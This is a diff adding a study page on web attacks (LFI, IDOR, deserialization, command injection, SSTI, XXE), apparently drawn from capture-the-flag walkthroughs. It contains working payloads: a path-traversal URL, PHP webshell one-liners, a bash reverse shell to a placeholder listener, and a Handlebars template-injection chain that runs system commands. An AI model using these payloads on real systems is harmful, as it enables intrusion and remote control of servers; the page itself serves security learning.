@@ -1,0 +1,130 @@
+---
+title: Request Abuse and Injection
+description: CSRF, file inclusion, IDOR, deserialization, injection, and server-side issues.
+---
+
+Cross-Site Request Forgery (CSRF) is another class of vulnerability focused on poor session controls and session management.
+
+
+File Inclusion Vulnerability
+Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET
+and POST parameters, cookies, and other variables. It is common for a page to "include" another page
+based on some of these parameters.
+LFI or Local File Inclusion Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploitation of vulnerable inclusion procedures implemented in an application. This occurs when an attacker is able to get a website to include a file that was notintended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.
+RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote(upload a file through)
+file on the host using protocols like HTTP, FTP etc.
+We test the page parameter to see if we can include files on the target system in the server response. We
+will test with some commonly known files that will have the same name across networks, Windows
+domains, and systems which can be found here. One of the most common files that a penetration tester
+might attempt to access on a Windows machine to verify LFI is the hosts file,
+WINDOWS\System32\drivers\etc\hosts (this file aids in the local translation of host names to IP
+addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
+included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\ .
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+## Insecure Direct Object Reference (IDOR)
+IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.
+
+## Insecure Deserialization
+"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application."
+This definition is still quite broad to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code, allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.
+Specifically, this malicious code leverages the legitimate serialization and deserialization process used by web applications. Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage. Alternatively, deserialisation is the reverse of this, converting serialised information into their complex form - an object that the application will understand. Insecure deserialization occurs when data from an untrusted party (i.e., a hacker) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred.
+
+## Zero-Day Vulnerabilities
+A "zero-day" (also called "0-day") vulnerability is a newly discovered software bug that a developer was not aware of before the software was released. Therefore, after it is discovered, the developer has "zero" days to patch it before it can be exploited. When a "zero-day attack" occurs, the vulnerability quickly becomes known and is patched by the developer.
+
+## Distributed Denial of Service (DDoS)
+DDoS stands for Distributed Denial of Service. A DDoS attack is when an attacker attempts to make a resource, such as a website's various servers, go offline by overwhelming it with web traffic. How does an attacker do this? They make requests to a resource with a large number of computers, overwhelming the resource and making it run slower and slower until eventually, it goes offline entirely.
+Because an attacker must use a large number of computers, the attack is "distributed" across multiple devices. The goal is to knock the resource offline so that it "denies service"; hence the name "distributed denial of service". This traffic comes from botnets. Botnets are "robot networks" made up of computers infected by malware. These botnets can be made up of millions of bots, and can even include IoT devices. A single attacker can spread malware to many devices and then use all of those devices in concert to act together, oftentimes without the victims ever knowing that their devices are infected.
+
+
+## Command Injection 
+This is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with. A command injection vulnerability is also known as a "Remote Code Execution" (RCE) because an attacker can trick the application into executing a series of payloads that they provide, without direct access to the machine itself (i.e. an interactive shell). The webserver will process this code and execute it under the privileges and access controls of the user who is running that application.  
+
+Command injection is also often known as “Remote Code Execution” (RCE) because of the ability to remotely execute code within an application. These vulnerabilities are often the most lucrative to an attacker because it means that the attacker can directly interact with the vulnerable system. For example, an attacker may read system or user files, data, and things of that nature. This attack differs from Code Injection, in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.
+https://github.com/payloadbox/command-injection-payload-list
+
+In computer security, arbitrary code execution (ACE) is an attacker's ability to execute
+arbitrary commands or code on a target machine or in a target process. [..] A program
+designed to exploit such a vulnerability is called an arbitrary code execution exploit.
+The ability to trigger arbitrary code execution over a network (primarily via a wide-area
+network such as the Internet) is often called remote code execution (RCE)
+Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack.
+
+## Remote Code Execution (as the name suggests) 
+This would allow us to execute code arbitrarily on the web server. Whilst this is likely to be as a low-privileged WEB USER ACCOUNT (such as www-data on Linux servers -> we can't achieve many things as the role has restricted access on the system, www-data is a default user on systems where web servers are installed and usually has minimal privileges. Since the website might be making use of PHP and SQL we can enumerate further the web directory for potential disclosures or misconfigurations. After some search we can find some interesting php files under /var/www/html/cdn-cgi/login directory), it's still an extremely serious vulnerability. Remote code execution through a web application tends to be a result of uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute). There are two basic ways to achieve RCE on a webserver: Webshells, and Reverse shells. Realistically a fully featured reverse shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads). Note that when using webshells, it's usually easier to view the output by looking at the source code of the page. This drastically improves the formatting of the output. 
+```php
+<?php echo system($_GET["cmd"]); ?>
+```
+This retrieves the command strictly from the query parameters of a GET request.
+
+```php
+<?php echo system($_REQUEST['cmd']);?>
+```
+This can retrieve the command from both the query parameters & the body of the request. It works with GET/POST/COOKIE data.
+This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.
+We are making use of the $_REQUEST method to fetch the cmd parameter because it works for fetching both URL parameters in GET requests and HTTP request body parameters in case of POST requests. Furthermore, we also use a POST request later in the walkthrough, thus using the $_REQUEST method is the most effective way to fetch the cmd parameter in this context. If the current request is an HTTP GET request and we can attempt to use it to send a command that will grant us a reverse shell on the system, however, it is likely that one might encounter errors due to the presence of special characters in the URL (even after URL encoding them). Instead, let us convert this GET request to a POST request and send the reverse shell command as an HTTP POST parameter. Right-click inside the Request body box, and click on the "Change request method" in order to convert this HTTP GET request to an HTTP POST request
+In the repeater tab, we can alter the request and set the following reverse shell payload as a value for the cmd parameter:
+
+```bash
+/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'
+```
+
+This reverse shell payload will make the remote host connect back to us with an interactive bash shell on the specified port that we are listening on. It's important to URL encode the payload, or else the server will not interpret the command correctly. For example, in the POST body, the & character is used to signal the start of a new parameter. But we have two & characters in our string that are both a part of the cmd parameter. By encoding them, this tells the server
+to treat this entire string as part of cmd 
+
+## Directory Traversal
+Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.
+
+
+## Server Side Template Injection (SSTI).
+What is an SSTI? Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.
+To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code execution on the affected server.
+What is a Template Engine? 
+Template Engines are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client (i.e. a user opening a page through their browser). For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails, Birthdays and various other content, that is very hard if not impossible to achieve for multiple different users with a static HTML page. The template engine would be used here, along a static "template" that contains the basic structure of the profile page, which would then manually fill in the user information and display it to the user. Template Engines, like all software, are prone to vulnerabilities. The vulnerability that we will be focusing on today is called Server-side template injection.
+The response shows an error that states require is not defined . Taking a look at the payload we notice the following code.
+
+```text
+{{this.push "return require('child_process').exec('whoami');"}}
+```
+
+This is likely the part of the payload that is erroring out. require is a keyword in Javascript and more specifically Node.js that is used to load code from other modules or files. The above code is attempting to load the Child Process module into memory and use it to execute system commands (in this case whoami ). Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use require to load such modules, we will have to find a different way require is in fact not in the global scope and therefore in specific cases it might not be accessible. Taking a closer look at the documentation we see that there is a process object available. The documentation states that this object provides information about, and control over, the current Node.js process. We might be able to use this object to load a module.
+
+```text
+{{this.push "return process;"}}
+```
+
+Taking a closer look at the documentation of the process object, we see that it has a .mainModule property  details the usage of this property. Specifically, it mentions that this property returns an object that contains the reference of main module. Since handlebars is running in a sandboxed environment, we might be able to use the mainModule property to directly load the main function and since the main function is most probably not sandboxed, load require from there. Let's modify our payload once more to see if mainModule is accessible.
+
+```text
+{{this.push "return process.mainModule;"}}
+```
+
+Now lets attempt to call require and load a module. We can load the child_process module as it is available on default Node.js installations and can be used to execute system commands
+
+```text
+{{this.push "return process.mainModule.require('child_process');"}}
+{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
+```
+
+## Extensible Markup Language (XML) is a markup language that defines a set of rules for encoding documents in a format that is both human-
+readable and machine-readable." What about XML entities? They "are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>` . These are metacharacters used to denote XML tags, and so must generally be represented using. their entities when they appear within data. You can read more about this subject on The vulnerability comes into play when a misconfiguration exists in the XML parser on the server'scside. From OWASP's definition of XXE Processing:
+"An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weaklycconfigured XML parser. This attack may lead to the disclosure of confidential data, denial of service,cserver side request forgery, port scanning from the perspective of the machine where the parser isclocated, and other system impacts. The XML 1.0 standard defines the structure of an XML document. The standard defines a concept called
+an entity, which is a storage unit of some type. There are a few different types of entities, external
+general/parameter parsed entity often shortened to external entity, that can access local or remote
+content via a declared system identifier. The system identifier is assumed to be a URI that can be
+dereferenced (accessed) by the XML processor when processing the entity. The XML processor then
+replaces occurrences of the named external entity with the contents dereferenced by the system
+identifier. If the system identifier contains tainted data and the XML processor dereferences this tainted
+data, the XML processor may disclose confidential information normally not accessible by the
+application. Similar attack vectors apply the usage of external DTDs, external stylesheets, external
+schemas, etc. which, when included, allow similar external resource inclusion style attacks.
+Attacks can include disclosing local files, which may contain sensitive data such as passwords or private
+user data, using file: schemes or relative paths in the system identifier. Since the attack occurs relative to
+the application processing the XML document, an attacker may use this trusted application to pivot to
+other internal systems, possibly disclosing other internal content via http(s) requests or launching a CSRF
+attack to any unprotected internal services. In some situations, an XML processor library that is
+vulnerable to client-side memory corruption issues may be exploited by dereferencing a malicious URI,
+possibly allowing arbitrary code execution under the application account. Other attacks can access local
+resources that may not stop returning data, possibly impacting application availability if too many
+threads or processes are not released.
